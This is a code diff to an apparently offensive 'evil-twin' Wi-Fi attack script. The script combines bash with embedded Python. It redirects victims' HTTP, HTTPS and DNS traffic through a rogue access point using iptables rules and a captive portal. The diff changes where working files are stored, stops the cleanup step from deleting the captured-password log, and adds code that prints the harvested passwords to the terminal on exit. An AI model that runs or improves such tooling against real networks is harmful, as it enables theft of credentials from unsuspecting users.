@@ -24,7 +24,8 @@ BOLD_WHITE='\e[1;37m'       # white
 DEFAULT_FOREGROUND_COLOR='\e[39m'   # Default foreground color.
 
 # Variables.
-TMP_DIR="/tmp/evil-twin-automated"
+SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
+TMP_DIR="${SCRIPT_DIR}/tmp"
 
 # Real LAN network variables.
 IP_SUBNET=192.168.1.0
@@ -726,8 +727,8 @@ LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
 HTTP_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
 HTTPS_PORT = 443
 
-CERT_FILE = "/tmp/evil-twin-automated/server.crt"
-KEY_FILE = "/tmp/evil-twin-automated/server.key"
+CERT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.crt")
+KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.key")
 
 if not os.path.exists(CERT_FILE):
     from subprocess import check_call
@@ -808,7 +809,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
         try:
-            with open("/tmp/evil-twin-automated/dns_server.pid") as f:
+            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")) as f:
                 pid = int(f.read().strip())
                 os.kill(pid, signal.SIGTERM)
         except: pass
@@ -872,11 +873,21 @@ cleanup() {
     iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
     rm -f "${DHCPD_CONF}" "${DHCPD_LEASES}" 2>/dev/null || true
-    rm -rf "${TMP_DIR}" 2>/dev/null || true
     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Done.${WHITE}"
+    if [ -s "${TMP_DIR}/passwords.txt" ]; then
+        echo ""
+        echo -e "${WHITE}[${YELLOW}!${WHITE}]${BOLD_GREEN} Captured passwords:${WHITE}"
+        cat "${TMP_DIR}/passwords.txt"
+        echo ""
+    fi
+    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Logs and passwords kept in ${BOLD_CYAN}${TMP_DIR}${WHITE}"
 }
 
 main() {
+    if [ "$(whoami)" == "root" ]; then
+        rm -rf "${TMP_DIR}"
+        mkdir -p "${TMP_DIR}"
+    fi
     trap cleanup EXIT INT TERM
     local result='main'
     while [ "${result}" == 'main' ];
